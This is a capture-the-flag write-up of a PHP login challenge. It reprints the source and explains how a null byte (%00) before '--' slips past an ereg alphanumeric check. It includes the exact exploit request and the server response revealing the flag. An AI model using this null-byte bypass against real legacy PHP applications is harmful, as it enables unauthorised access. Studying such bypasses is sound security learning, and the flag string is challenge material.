### Solved by NullMode

We were able to get the the source code for this challenge by requesting ```index.txt``` on the web server. Turned out to have some funky checks being made:

```
<html>
<head>
    <title>level6</title>
   <link rel='stylesheet' href='style.css' type='text/css'>
</head>
<body>

<?php
require 'flag.php';

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        echo '<p class="alert">You password must be =
alphanumeric</p>';
    else if (strpos ($_GET['password'], '--') !== FALSE)
        die('Flag: ' . $flag);
    else
        echo '<p class="alert">Invalid password</p>';
}
?>

<section class="login">
       <div class="title">
               <a href="./index.txt">Level 6</a>
       </div>

       <form method="get">
               <input type="text" required name="password" = placeholder="Password" /><br/>
               <input type="submit"/>
       </form>
</section>
</body>
</html>
```

From the above we can determine that the password parameter can only be a set of alphanumeric characters. However, the password must also contain `--` somewhere.

I tried breaking out of the regular expression with new lines, but that didn't work. I then tried inserting a nullbyte followed by the `--` string. Success!

The regular expression treated the null byte as the end of the string, however the strips function looked through the entire variable for the `--`.

### Payload

```
GET /?password=lolol%00-- HTTP/1.1
Host: 52.10.107.64:8006
Connection: keep-alive
```

### Response - With flag \o/

```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 28 Feb 2015 12:48:41 GMT
Content-Type: text/html
Connection: keep-alive
Content-Length: 162

<html>
<head>
    <title>level6</title>
    <link rel='stylesheet' href='style.css' type='text/css'>
</head>
<body>

Flag: OK_Maybe_using_rexpexp_wasnt_a_clever_move
```

